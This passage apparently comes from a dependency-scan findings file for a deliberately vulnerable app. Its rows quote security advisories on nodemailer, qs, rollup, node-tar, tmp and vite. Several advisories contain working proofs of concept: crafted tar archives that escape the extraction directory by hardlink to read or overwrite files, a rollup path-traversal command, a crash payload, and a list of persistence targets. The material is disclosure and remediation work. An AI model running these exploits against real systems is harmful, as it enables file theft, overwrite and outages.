buildDeepGroup(DEPTH); console.log('to header length:', toHeader.length); const transporter = nodemailer.createTransport({ streamTransport: true, buffer: true, newline: 'unix' }); console.log('parsing start'); transporter.sendMail( { from: 'test@example.com', to: toHeader, subject: 'test', text: 'test' }, (err, info) => { if (err) { console.error('error:', err); } else { console.log('finished :', info && info.envelope); } } ); ``` As a result, when the colon is repeated beyond a certain threshold, the Node.js process terminates immediately. ### Impact The attacker can achieve the following: 1. Force an immediate crash of any server/service that uses Nodemailer 2. Kill the backend process with a single web request 3. In environments using PM2/Forever, trigger a continuous restart loop, causing severe resource exhaustion”",GHSA-rcmh-qjqh-p98v

DEPCHECK-BROKEN-CRYSTALS-042,dep-check,broken-crystals,sca,CWE-20,HIGH,qs:6.10.4,"### Summary The `arrayLimit` option in qs did not enforce limits for bracket notation (`a[]=1&a[]=2`), only for indexed notation (`a[0]=1`). This is a consistency bug; `arrayLimit` should apply uniformly across all array notations. **Note:** The default `parameterLimit` of 1000 effectively mitigates the DoS scenario originally described. With default options, bracket notation cannot produce arrays larger than `parameterLimit` regardless of `arrayLimit`, because each `a[]=value` consumes one parameter slot. The severity has been reduced accordingly. ### Details The `arrayLimit` option only checked limits for indexed notation (`a[0]=1&a[1]=2`) but did not enforce it for bracket notation (`a[]=1&a[]=2`). **Vulnerable code** (`lib/parse.js:159-162`): ```javascript if (root === '[]' && options.parseArrays) { obj = utils.combine([], leaf); // No arrayLimit check } ``` **Working code** (`lib/parse.js:175`): ```javascript else if (index <= options.arrayLimit) { // Limit checked here obj = []; obj[index] = leaf; } ``` The bracket notation handler at line 159 uses `utils.combine([], leaf)` without validating against `options.arrayLimit`, while indexed notation at line 175 checks `index <= options.arrayLimit` before creating arrays. ### PoC ```javascript const qs = require('qs'); const result = qs.parse('a[]=1&a[]=2&a[]=3&a[]=4&a[]=5&a[]=6', { arrayLimit: 5 }); console.log(result.a.length); // Output: 6 (should be max 5) ``` **Note on parameterLimit interaction:** The original advisory's ""DoS demonstration"" claimed a length of 10,000, but `parameterLimit` (default: 1000) caps parsing to 1,000 parameters. With default options, the actual output is 1,000, not 10,000. ### Impact Consistency bug in `arrayLimit` enforcement. With default `parameterLimit`, the practical DoS risk is negligible since `parameterLimit` already caps the total number of parsed parameters (and thus array elements from bracket notation). The risk increases only when `parameterLimit` is explicitly set to a very high value.",GHSA-6rw7-vpxm-498p
DEPCHECK-BROKEN-CRYSTALS-043,dep-check,broken-crystals,sca,CWE-20,LOW,qs:6.10.4,"### Summary The `arrayLimit` option in qs does not enforce limits for comma-separated values when `comma: true` is enabled, allowing attackers to cause denial-of-service via memory exhaustion. This is a bypass of the array limit enforcement, similar to the bracket notation bypass addressed in GHSA-6rw7-vpxm-498p (CVE-2025-15284). ### Details When the `comma` option is set to `true` (not the default, but configurable in applications), qs allows parsing comma-separated strings as arrays (e.g., `?param=a,b,c` becomes `['a', 'b', 'c']`). However, the limit check for `arrayLimit` (default: 20) and the optional throwOnLimitExceeded occur after the comma-handling logic in `parseArrayValue`, enabling a bypass. This permits creation of arbitrarily large arrays from a single parameter, leading to excessive memory allocation. **Vulnerable code** (lib/parse.js: lines ~40-50): ```js if (val && typeof val === 'string' && options.comma && val.indexOf(',') > -1) { return val.split(','); } if (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) { throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.'); } return val; ``` The `split(',')` returns the array immediately, skipping the subsequent limit check. Downstream merging via `utils.combine` does not prevent allocation, even if it marks overflows for sparse arrays.This discrepancy allows attackers to send a single parameter with millions of commas (e.g., `?param=,,,,,,,,...`), allocating massive arrays in memory without triggering limits. It bypasses the intent of `arrayLimit`, which is enforced correctly for indexed (`a[0]=`) and bracket (`a[]=`) notations (the latter fixed in v6.14.1 per GHSA-6rw7-vpxm-498p). ### PoC **Test 1 - Basic bypass:** ``` npm install qs ``` ```js const qs = require('qs'); const payload = 'a=' + ','.repeat(25); // 26 elements after split (bypasses arrayLimit: 5) const options = { comma: true, arrayLimit: 5, throwOnLimitExceeded: true }; try { const result = qs.parse(payload, options); console.log(result.a.length); // Outputs: 26 (bypass successful) } catch (e) { console.log('Limit enforced:', e.message); // Not thrown } ``` **Configuration:** - `comma: true` - `arrayLimit: 5` - `throwOnLimitExceeded: true` Expected: Throws ""Array limit exceeded"" error. Actual: Parses successfully, creating an array of length 26. ### Impact Denial of Service (DoS) via memory exhaustion. ### Suggested Fix Move the `arrayLimit` check before the comma split in `parseArrayValue`, and enforce it on the resulting array length. Use `currentArrayLength` (already calculated upstream) for consistency with bracket notation fixes. **Current code** (lib/parse.js: lines ~40-50): ```js if (val && typeof val === 'string' && options.comma && val.indexOf(',') > -1) { return val.split(','); } if (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) { throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.'); } return val; ``` **Fixed code:** ```js if (val && typeof val === 'string' && options.comma && val.indexOf(',') > -1) { const splitArray = val.split(','); if (splitArray.length > options.arrayLimit - currentArrayLength) { // Check against remaining limit if (options.throwOnLimitExceeded) { throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.'); } else { // Optionally convert to object or truncate, per README return splitArray.slice(0, options.arrayLimit - currentArrayLength); } } return splitArray; } if (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) { throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.'); } return val; ``` This aligns behavior with indexed and bracket notations, reuses `currentArrayLength`, and respects `throwOnLimitExceeded`.

DEPCHECK-BROKEN-CRYSTALS-045,dep-check,broken-crystals,sca,CWE-22,HIGH,rollup:4.22.4,"### Summary The Rollup module bundler (specifically v4.x and present in current source) is vulnerable to an Arbitrary File Write via Path Traversal. Insecure file name sanitization in the core engine allows an attacker to control output filenames (e.g., via CLI named inputs, manual chunk aliases, or malicious plugins) and use traversal sequences (`../`) to overwrite files anywhere on the host filesystem that the build process has permissions for. This can lead to persistent Remote Code Execution (RCE) by overwriting critical system or user configuration files. ### Details The vulnerability is caused by the combination of two flawed components in the Rollup core: 1. **Improper Sanitization**: In `src/utils/sanitizeFileName.ts`, the `INVALID_CHAR_REGEX` used to clean user-provided names for chunks and assets excludes the period (`.`) and forward/backward slashes (`/`, `\`). ```typescript // src/utils/sanitizeFileName.ts (Line 3) const INVALID_CHAR_REGEX = /[\u0000-\u001F""#$%&*+,:;<=>?[\]^`{|}\u007F]/g; ``` This allows path traversal sequences like `../../` to pass through the sanitizer unmodified. 2. **Unsafe Path Resolution**: In `src/rollup/rollup.ts`, the `writeOutputFile` function uses `path.resolve` to combine the output directory with the ""sanitized"" filename. ```typescript // src/rollup/rollup.ts (Line 317) const fileName = resolve(outputOptions.dir || dirname(outputOptions.file!), outputFile.fileName); ``` Because `path.resolve` follows the `../` sequences in `outputFile.fileName`, the resulting path points outside of the intended output directory. The subsequent call to `fs.writeFile` completes the arbitrary write. ### PoC A demonstration of this vulnerability can be performed using the Rollup CLI or a configuration file. **Scenario: CLI Named Input Exploit** 1. Target a sensitive file location (for demonstration, we will use a file in the project root called `pwned.js`). 2. Execute Rollup with a specifically crafted named input where the key contains traversal characters: ```bash rollup --input ""a/../../pwned.js=main.js"" --dir dist ``` 3. **Result**: Rollup will resolve the output path for the entry chunk as `dist + a/../../pwned.js`, which resolves to the project root.

DEPCHECK-BROKEN-CRYSTALS-047,dep-check,broken-crystals,sca,CWE-176,HIGH,tar:6.2.1,"**TITLE**: Race Condition in node-tar Path Reservations via Unicode Sharp-S (ß) Collisions on macOS APFS **AUTHOR**: Tomás Illuminati ### Details A race condition vulnerability exists in `node-tar` (v7.5.3) this is to an incomplete handling of Unicode path collisions in the `path-reservations` system. On case-insensitive or normalization-insensitive filesystems (such as macOS APFS, In which it has been tested), the library fails to lock colliding paths (e.g., `ß` and `ss`), allowing them to be processed in parallel. This bypasses the library's internal concurrency safeguards and permits Symlink Poisoning attacks via race conditions. The library uses a `PathReservations` system to ensure that metadata checks and file operations for the same path are serialized. This prevents race conditions where one entry might clobber another concurrently. ```typescript // node-tar/src/path-reservations.ts (Lines 53-62) reserve(paths: string[], fn: Handler) { paths = isWindows ? ['win32 parallelization disabled'] : paths.map(p => { return stripTrailingSlashes( join(normalizeUnicode(p)), // <- THE PROBLEM FOR MacOS FS ).toLowerCase() }) ``` In MacOS the ```join(normalizeUnicode(p)), ``` FS confuses ß with ss, but this code does not. For example: ``````bash bash-3.2$ printf ""CONTENT_SS\n"" > collision_test_ss bash-3.2$ ls collision_test_ss bash-3.2$ printf ""CONTENT_ESSZETT\n"" > collision_test_ß bash-3.2$ ls -la total 8 drwxr-xr-x 3 testuser staff 96 Jan 19 01:25 . drwxr-x---+ 82 testuser staff 2624 Jan 19 01:25 .. -rw-r--r-- 1 testuser staff 16 Jan 19 01:26 collision_test_ss bash-3.2$ `````` --- ### PoC ``````javascript const tar = require('tar'); const fs = require('fs'); const path = require('path'); const { PassThrough } = require('stream'); const exploitDir = path.resolve('race_exploit_dir'); if (fs.existsSync(exploitDir)) fs.rmSync(exploitDir, { recursive: true, force: true }); fs.mkdirSync(exploitDir); console.log('[*] Testing...'); console.log(`[*] Extraction target: ${exploitDir}`); // Construct stream const stream = new PassThrough(); const contentA = 'A'.repeat(1000); const contentB = 'B'.repeat(1000); // Key 1: ""f_ss"" const header1 = new tar.Header({ path: 'collision_ss', mode: 0o644, size: contentA.length, }); header1.encode(); // Key 2: ""f_ß"" const header2 = new tar.Header({ path: 'collision_ß', mode: 0o644, size: contentB.length, }); header2.encode(); // Write to stream stream.write(header1.block); stream.write(contentA); stream.write(Buffer.alloc(512 - (contentA.length % 512))); // Padding stream.write(header2.block); stream.write(contentB); stream.write(Buffer.alloc(512 - (contentB.length % 512))); // Padding // End stream.write(Buffer.alloc(1024)); stream.end(); // Extract const extract = new tar.Unpack({ cwd: exploitDir, // Ensure jobs is high enough to allow parallel processing if locks fail jobs: 8 }); stream.pipe(extract); extract.on('end', () => { console.log('[*] Extraction complete'); // Check what exists const files = fs.readdirSync(exploitDir); console.log('[*] Files in exploit dir:', files); files.forEach(f => { const p = path.join(exploitDir, f); const stat = fs.statSync(p); const content = fs.readFileSync(p, 'utf8'); console.log(`File: ${f}, Inode: ${stat.ino}, Content: ${content.substring(0, 10)}...

This vulnerability affects users and systems using **node-tar on macOS (APFS/HFS+)**. Because of using `NFD` Unicode normalization (in which `ß` and `ss` are different), conflicting paths do not have their order properly preserved under filesystems that ignore Unicode normalization (e.g., APFS (in which `ß` causes an inode collision with `ss`)). This enables an attacker to circumvent internal parallelization locks (`PathReservations`) using conflicting filenames within a malicious tar archive. --- ### Remediation Update `path-reservations.js` to use a normalization form that matches the target filesystem's behavior (e.g., `NFKD`), followed by first `toLocaleLowerCase('en')` and then `toLocaleUpperCase('en')`. Users who cannot upgrade promptly, and who are programmatically using `node-tar` to extract arbitrary tarball data should filter out all `SymbolicLink` entries (as npm does) to defend against arbitrary file writes via this file system entry name collision issue. ---",GHSA-r6q2-hw4h-h46w
DEPCHECK-BROKEN-CRYSTALS-048,dep-check,broken-crystals,sca,CWE-22,HIGH,tar:6.2.1,"### Summary node-tar contains a vulnerability where the security check for hardlink entries uses different path resolution semantics than the actual hardlink creation logic. This mismatch allows an attacker to craft a malicious TAR archive that bypasses path traversal protections and creates hardlinks to arbitrary files outside the extraction directory. ### Details The vulnerability exists in `lib/unpack.js`. When extracting a hardlink, two functions handle the linkpath differently: **Security check in `[STRIPABSOLUTEPATH]`:** ```javascript const entryDir = path.posix.dirname(entry.path); const resolved = path.posix.normalize(path.posix.join(entryDir, linkpath)); if (resolved.startsWith('../')) { /* block */ } ``` **Hardlink creation in `[HARDLINK]`:** ```javascript const linkpath = path.resolve(this.cwd, entry.linkpath); fs.linkSync(linkpath, dest); ``` **Example:** An application extracts a TAR using `tar.extract({ cwd: '/var/app/uploads/' })`. The TAR contains entry `a/b/c/d/x` as a hardlink to `../../../../etc/passwd`. - **Security check** resolves the linkpath relative to the entry's parent directory: `a/b/c/d/ + ../../../../etc/passwd` = `etc/passwd`. No `../` prefix, so it **passes**. - **Hardlink creation** resolves the linkpath relative to the extraction directory (`this.cwd`): `/var/app/uploads/ + ../../../../etc/passwd` = `/etc/passwd`. This **escapes** to the system's `/etc/passwd`. The security check and hardlink creation use different starting points (entry directory `a/b/c/d/` vs extraction directory `/var/app/uploads/`), so the same linkpath can pass validation but still escape. The deeper the entry path, the more levels an attacker can escape. ### PoC #### Setup Create a new directory with these files: ``` poc/ ├── package.json ├── secret.txt ← sensitive file (target) ├── server.js ← vulnerable server ├── create-malicious-tar.js ├── verify.js └── uploads/ ← created automatically by server.js └── (extracted files go here) ``` **package.json** ```json { ""dependencies"": { ""tar"": ""^7.5.0"" } } ``` **secret.txt** (sensitive file outside uploads/) ``` DATABASE_PASSWORD=supersecret123 ``` **server.js** (vulnerable file upload server) ```javascript const http = require('http'); const fs = require('fs'); const path = require('path'); const tar = require('tar'); const PORT = 3000; const UPLOAD_DIR = path.join(__dirname, 'uploads'); fs.mkdirSync(UPLOAD_DIR, { recursive: true }); http.createServer((req, res) => { if (req.method === 'POST' && req.url === '/upload') { const chunks = []; req.on('data', c => chunks.push(c)); req.on('end', async () => { fs.writeFileSync(path.join(UPLOAD_DIR, 'upload.tar'), Buffer.concat(chunks)); await tar.extract({ file: path.join(UPLOAD_DIR, 'upload.tar'), cwd: UPLOAD_DIR }); res.end('Extracted\n'); }); } else if (req.method === 'GET' && req.url === '/read') { // Simulates app serving extracted files (e.g., file download, static assets) const targetPath = path.join(UPLOAD_DIR, 'd', 'x'); if (fs.existsSync(targetPath)) { res.end(fs.readFileSync(targetPath)); } else { res.end('File not found\n'); } } else if (req.method === 'POST' && req.url === '/write') { // Simulates app writing to extracted file (e.g., config update, log append) const chunks = []; req.on('data', c => chunks.push(c)); req.on('end', () => { const targetPath = path.join(UPLOAD_DIR, 'd', 'x'); if (fs.existsSync(targetPath)) { fs.writeFileSync(targetPath, Buffer.concat(chunks)); res.end('Written\n'); } else { res.end('File not found\n'); } }); } else { res.end('POST /upload, GET /read, or POST /write\n'); } }).listen(PORT, () => console.log(`http://localhost:${PORT}`)); ``` **create-malicious-tar.js** (attacker creates exploit TAR) ```javascript const fs = require('fs'); function tarHeader(name, type, linkpath = '', size = 0) { const b = Buffer.alloc(512, 0); b.write(name, 0); b.write('0000644', 100); b.write('0000000', 108); b.write('0000000', 116); b.write(size.toString(8).padStart(11, '0'), 124); b.write(Math.floor(Date.now()/1000).toString(8).padStart(11, '0'), 136); b.write(' ', 148); b[156] = type === 'dir' ? 53 : type === 'link' ? 49 : 48; if (linkpath) b.write(linkpath, 157); b.write('ustar\x00', 257); b.write('00', 263); let sum = 0; for (let i = 0; i < 512; i++) sum += b[i]; b.write(sum.toString(8).padStart(6, '0') + '\x00 ', 148); return b; } // Hardlink escapes to parent directory's secret.txt fs.writeFileSync('malicious.tar', Buffer.concat([ tarHeader('d/', 'dir'), tarHeader('d/x', 'link', '../secret.txt'), Buffer.alloc(1024) ])); console.log('Created malicious.tar'); ``` #### Run ```bash # Setup npm install echo ""DATABASE_PASSWORD=supersecret123"" > secret.txt # Terminal 1: Start server node server.js # Terminal 2: Execute attack node create-malicious-tar.js curl -X POST --data-binary @malicious.tar http://localhost:3000/upload # READ ATTACK: Steal secret.txt content via the hardlink curl http://localhost:3000/read # Returns: DATABASE_PASSWORD=supersecret123 # WRITE ATTACK: Overwrite secret.txt through the hardlink curl -X POST -d ""PWNED"" http://localhost:3000/write # Confirm secret.txt was modified cat secret.txt ``` ### Impact An attacker can craft a malicious TAR archive that, when extracted by an application using node-tar, creates hardlinks that escape the extraction directory. This enables: **Immediate (Read Attack):** If the application serves extracted files, attacker can read any file readable by the process. **Conditional (Write Attack):** If the application later writes to the hardlink path, it modifies the target file outside the extraction directory. ### Remote Code Execution / Server Takeover | Attack Vector | Target File | Result | |--------------|-------------|--------| | SSH Access | `~/.ssh/authorized_keys` | Direct shell access to server | | Cron Backdoor | `/etc/cron.d/*`, `~/.crontab` | Persistent code execution | | Shell RC Files | `~/.bashrc`, `~/.profile` | Code execution on user login | | Web App Backdoor | Application `.js`, `.php`, `.py` files | Immediate RCE via web requests | | Systemd Services | `/etc/systemd/system/*.service` | Code execution on service restart | | User Creation | `/etc/passwd` (if running as root) | Add new privileged user | ## Data Exfiltration & Corruption 1. **Overwrite arbitrary files** via hardlink escape + subsequent write operations 2. **Read sensitive files** by creating hardlinks that point outside extraction directory 3. **Corrupt databases** and application state 4. **Steal credentials** from config files, `.env`, secrets",GHSA-34x7-hfp2-rc4v
DEPCHECK-BROKEN-CRYSTALS-049,dep-check,broken-crystals,sca,CWE-22,HIGH,tar:6.2.1,"### Summary `tar.extract()` in Node `tar` allows an attacker-controlled archive to create a hardlink inside the extraction directory that points to a file outside the extraction root, using default options. This enables **arbitrary file read and write** as the extracting user (no root, no chmod, no `preservePaths`). Severity is high because the primitive bypasses path protections and turns archive extraction into a direct filesystem access primitive. ### Details The bypass chain uses two symlinks plus one hardlink: 1. `a/b/c/up -> ../..` 2. `a/b/escape -> c/up/../..` 3. `exfil` (hardlink) -> `a/b/escape/<target-relative-to-parent-of-extract>` Why this works: - Linkpath checks are string-based and do not resolve symlinks on disk for hardlink target safety. - See `STRIPABSOLUTEPATH` logic in: - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:255` - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:268` - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:281` - Hardlink extraction resolves target as `path.resolve(cwd, entry.linkpath)` and then calls `fs.link(target, destination)`. - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:566` - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:567` - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:703` - Parent directory safety checks (`mkdir` + symlink detection) are applied to the destination path of the extracted entry, not to the resolved hardlink target path. - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:617` - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:619` - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/mkdir.js:27` - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/mkdir.js:101` As a result, `exfil` is created inside extraction root but linked to an external file. The PoC confirms shared inode and successful read+write via `exfil`. ### PoC [hardlink.js](https://github.com/user-attachments/files/25240082/hardlink.js) Environment used for validation: - Node: `v25.4.0` - tar: `7.5.7` - OS: macOS Darwin 25.2.0 - Extract options: defaults (`tar.extract({ file, cwd })`) Steps: 1. Prepare/locate a `tar` module. If `require('tar')` is not available locally, set `TAR_MODULE` to an absolute path to a tar package directory. 2. Run: ```bash TAR_MODULE=""$(cd '../tar-audit-setuid - CVE/node_modules/tar' && pwd)"" node hardlink.js ``` 3. Expected vulnerable output (key lines): ```text same_inode=true read_ok=true write_ok=true result=VULNERABLE ``` Interpretation: - `same_inode=true`: extracted `exfil` and external secret are the same file object. - `read_ok=true`: reading `exfil` leaks external content. - `write_ok=true`: writing `exfil` modifies external file. ### Impact Vulnerability type: - Arbitrary file read/write via archive extraction path confusion and link resolution. Who is impacted: - Any application/service that extracts attacker-controlled tar archives with Node `tar` defaults. - Impact scope is the privileges of the extracting process user. Potential outcomes: - Read sensitive files reachable by the process user. - Overwrite writable files outside extraction root. - Escalate impact depending on deployment context (keys, configs, scripts, app data).",GHSA-83g3-92jg-28cx
DEPCHECK-BROKEN-CRYSTALS-050,dep-check,broken-crystals,sca,CWE-22,HIGH,tar:6.2.1,"### Summary The `node-tar` library (`<= 7.5.2`) fails to sanitize the `linkpath` of `Link` (hardlink) and `SymbolicLink` entries when `preservePaths` is false (the default secure behavior). This allows malicious archives to bypass the extraction root restriction, leading to **Arbitrary File Overwrite** via hardlinks and **Symlink Poisoning** via absolute symlink targets. ### Details The vulnerability exists in `src/unpack.ts` within the `[HARDLINK]` and `[SYMLINK]` methods. **1. Hardlink Escape (Arbitrary File Overwrite)** The extraction logic uses `path.resolve(this.cwd, entry.linkpath)` to determine the hardlink target. Standard Node.js behavior dictates that if the second argument (`entry.linkpath`) is an **absolute path**, `path.resolve` ignores the first argument (`this.cwd`) entirely and returns the absolute path. The library fails to validate that this resolved target remains within the extraction root. A malicious archive can create a hardlink to a sensitive file on the host (e.g., `/etc/passwd`) and subsequently write to it, if file permissions allow writing to the target file, bypassing path-based security measures that may be in place. **2. Symlink Poisoning** The extraction logic passes the user-supplied `entry.linkpath` directly to `fs.symlink` without validation. This allows the creation of symbolic links pointing to sensitive absolute system paths or traversing paths (`../../`), even when secure extraction defaults are used. ### PoC The following script generates a binary TAR archive containing malicious headers (a hardlink to a local file and a symlink to `/etc/passwd`). It then extracts the archive using standard `node-tar` settings and demonstrates the vulnerability by verifying that the local ""secret"" file was successfully overwritten. ```javascript const fs = require('fs') const path = require('path') const tar = require('tar') const out = path.resolve('out_repro') const secret = path.resolve('secret.txt') const tarFile = path.resolve('exploit.tar') const targetSym = '/etc/passwd' // Cleanup & Setup try { fs.rmSync(out, {recursive:true, force:true}); fs.unlinkSync(secret) } catch {} fs.mkdirSync(out) fs.writeFileSync(secret, 'ORIGINAL_DATA') // 1. Craft malicious Link header (Hardlink to absolute local file) const h1 = new tar.Header({ path: 'exploit_hard', type: 'Link', size: 0, linkpath: secret }) h1.encode() // 2. Craft malicious Symlink header (Symlink to /etc/passwd) const h2 = new tar.Header({ path: 'exploit_sym', type: 'SymbolicLink', size: 0, linkpath: targetSym }) h2.encode() // Write binary tar fs.writeFileSync(tarFile, Buffer.concat([ h1.block, h2.block, Buffer.alloc(1024) ])) console.log('[*] Extracting malicious tarball...') // 3. Extract with default secure settings tar.x({ cwd: out, file: tarFile, preservePaths: false }).then(() => { console.log('[*] Verifying payload...') // Test Hardlink Overwrite try { fs.writeFileSync(path.join(out, 'exploit_hard'), 'OVERWRITTEN') if (fs.readFileSync(secret, 'utf8') === 'OVERWRITTEN') { console.log('[+] VULN CONFIRMED: Hardlink overwrite successful') } else { console.log('[-] Hardlink failed') } } catch (e) {} // Test Symlink Poisoning try { if (fs.readlinkSync(path.join(out, 'exploit_sym')) === targetSym) { console.log('[+] VULN CONFIRMED: Symlink points to absolute path') } else { console.log('[-] Symlink failed') } } catch (e) {} }) ``` ### Impact * **Arbitrary File Overwrite:** An attacker can overwrite any file the extraction process has access to, bypassing path-based security restrictions. It does not grant write access to files that the extraction process does not otherwise have access to, such as root-owned configuration files. * **Remote Code Execution (RCE):** In CI/CD environments or automated pipelines, overwriting configuration files, scripts, or binaries leads to code execution. (However, npm is unaffected, as it filters out all `Link` and `SymbolicLink` tar entries from extracted packages.)",GHSA-8qq5-rm4j-mr97

Tested on a Linux machine. - Setup: create a symbolic link inside the `tmpDir` that points to a directory outside of it ```bash mkdir $HOME/mydir1 ln -s $HOME/mydir1 ${TMPDIR:-/tmp}/evil-dir ``` - check the folder is empty: ```bash ls -lha $HOME/mydir1 | grep ""tmp-"" ``` - run the poc ```bash node main.js File: /tmp/evil-dir/tmp-26821-Vw87SLRaBIlf test 1: ENOENT: no such file or directory, open '/tmp/mydir1/tmp-[random-id]' test 2: dir option must be relative to ""/tmp"", found ""/foo"". test 3: dir option must be relative to ""/tmp"", found ""/home/user/mydir1"". ``` - the temporary file is created under `$HOME/mydir1` (outside the `tmpDir`): ```bash ls -lha $HOME/mydir1 | grep ""tmp-"" -rw------- 1 user user 0 Apr X XX:XX tmp-[random-id] ``` - `main.js` ```js // npm i tmp@0.2.3 const tmp = require('tmp'); const tmpobj = tmp.fileSync({ 'dir': 'evil-dir'}); console.log('File: ', tmpobj.name); try { tmp.fileSync({ 'dir': 'mydir1'}); } catch (err) { console.log('test 1:', err.message) } try { tmp.fileSync({ 'dir': '/foo'}); } catch (err) { console.log('test 2:', err.message) } try { const fs = require('node:fs'); const resolved = fs.realpathSync('/tmp/evil-dir'); tmp.fileSync({ 'dir': resolved}); } catch (err) { console.log('test 3:', err.message) } ``` A Potential fix could be to call `fs.realpathSync` (or similar) that resolves also symbolic links. ```js function _resolvePath(name, tmpDir) { let resolvedPath; if (name.startsWith(tmpDir)) { resolvedPath = path.resolve(name); } else { resolvedPath = path.resolve(path.join(tmpDir, name)); } return fs.realpathSync(resolvedPath); } ``` ### Impact Arbitrary temporary file / directory write via symlink",GHSA-52f5-9888-hmc6

DEPCHECK-BROKEN-CRYSTALS-056,dep-check,broken-crystals,sca,CWE-346,INFO,vite:5.4.10,"### Summary Vite allowed any websites to send any requests to the development server and read the response due to default CORS settings and lack of validation on the Origin header for WebSocket connections. > [!WARNING] > This vulnerability even applies to users that only run the Vite dev server on the local machine and does not expose the dev server to the network. ### Upgrade Path Users that does not match either of the following conditions should be able to upgrade to a newer version of Vite that fixes the vulnerability without any additional configuration. - Using the backend integration feature - Using a reverse proxy in front of Vite - Accessing the development server via a domain other than `localhost` or `*.localhost` - Using a plugin / framework that connects to the WebSocket server on their own from the browser #### Using the backend integration feature If you are using the backend integration feature and not setting [`server.origin`](https://vite.dev/config/server-options.html#server-origin), you need to add the origin of the backend server to the [`server.cors.origin`](https://github.com/expressjs/cors#configuration-options) option. Make sure to set a specific origin rather than `*`, otherwise any origin can access your development server. #### Using a reverse proxy in front of Vite If you are using a reverse proxy in front of Vite and sending requests to Vite with a hostname other than `localhost` or `*.localhost`, you need to add the hostname to the new [`server.allowedHosts`](https://vite.dev/config/server-options.html#server-allowedhosts) option. For example, if the reverse proxy is sending requests to `http://vite:5173`, you need to add `vite` to the `server.allowedHosts` option. #### Accessing the development server via a domain other than `localhost` or `*.localhost` You need to add the hostname to the new [`server.allowedHosts`](https://vite.dev/config/server-options.html#server-allowedhosts) option. For example, if you are accessing the development server via `http://foo.example.com:8080`, you need to add `foo.example.com` to the `server.allowedHosts` option. #### Using a plugin / framework that connects to the WebSocket server on their own from the browser If you are using a plugin / framework, try upgrading to a newer version of Vite that fixes the vulnerability. If the WebSocket connection appears not to be working, the plugin / framework may have a code that connects to the WebSocket server on their own from the browser. In that case, you can either: - fix the plugin / framework code to the make it compatible with the new version of Vite - set `legacy.skipWebSocketTokenCheck: true` to opt-out the fix for [2] while the plugin / framework is incompatible with the new version of Vite - When enabling this option, **make sure that you are aware of the security implications** described in the impact section of [2] above. ### Mitigation without upgrading Vite #### [1]: Permissive default CORS settings Set `server.cors` to `false` or limit `server.cors.origin` to trusted origins. #### [2]: Lack of validation on the Origin header for WebSocket connections There aren't any mitigations for this. #### [3]: Lack of validation on the Host header for HTTP requests Use Chrome 94+ or use HTTPS for the development server. ### Details There are three causes that allowed malicious websites to send any requests to the development server: #### [1]: Permissive default CORS settings Vite sets the [`Access-Control-Allow-Origin`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin) header depending on [`server.cors`](https://vite.dev/config/server-options.html#server-cors) option. The default value was `true` which sets `Access-Control-Allow-Origin: *`. This allows websites on any origin to `fetch` contents served on the development server. Attack scenario: 1. The attacker serves a malicious web page (`http://malicious.example.com`). 2. The user accesses the malicious web page. 3. The attacker sends a `fetch('http://127.0.0.1:5173/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above. 4. The attacker gets the content of `http://127.0.0.1:5173/main.js`. #### [2]: Lack of validation on the Origin header for WebSocket connections Vite starts a WebSocket server to handle HMR and other functionalities. This WebSocket server [did not perform validation on the Origin header](https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/src/node/server/ws.ts#L145-L157) and was vulnerable to Cross-Site WebSocket Hijacking (CSWSH) attacks. With that attack, an attacker can read and write messages on the WebSocket connection. Vite only sends some information over the WebSocket connection ([list of the file paths that changed, the file content where the errored happened, etc.](https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/types/hmrPayload.d.ts#L12-L72)), but plugins can send arbitrary messages and may include more sensitive information. Attack scenario: 1. The attacker serves a malicious web page (`http://malicious.example.com`). 2. The user accesses the malicious web page. 3. The attacker runs `new WebSocket('http://127.0.0.1:5173', 'vite-hmr')` by JS in that malicious web page. 4. The user edits some files. 5. Vite sends some HMR messages over WebSocket. 6. The attacker gets the content of the HMR messages. #### [3]: Lack of validation on the Host header for HTTP requests Unless [`server.https`](https://vite.dev/config/server-options.html#server-https) is set, Vite starts the development server on HTTP. Non-HTTPS servers are vulnerable to DNS rebinding attacks without validation on the Host header. But Vite did not perform validation on the Host header. By exploiting this vulnerability, an attacker can send arbitrary requests to the development server bypassing the same-origin policy. 1. The attacker serves a malicious web page that is served on **HTTP** (`http://malicious.example.com:5173`) (HTTPS won't work). 2. The user accesses the malicious web page. 3. The attacker changes the DNS to point to 127.0.0.1 (or other private addresses). 4. The attacker sends a `fetch('/main.js')` request by JS in that malicious web page. 5. The attacker gets the content of `http://127.0.0.1:5173/main.js` bypassing the same origin policy. ### Impact #### [1]: Permissive default CORS settings Users with the default `server.cors` option may: - get the source code stolen by malicious websites - give the attacker access to functionalities that are not supposed to be exposed externally - Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind `server.proxy` may have those functionalities. #### [2]: Lack of validation on the Origin header for WebSocket connections All users may get the file paths of the files that changed and the file content where the error happened be stolen by malicious websites. For users that is using a plugin that sends messages over WebSocket, that content may be stolen by malicious websites. For users that is using a plugin that has a functionality that is triggered by messages over WebSocket, that functionality may be exploited by malicious websites. #### 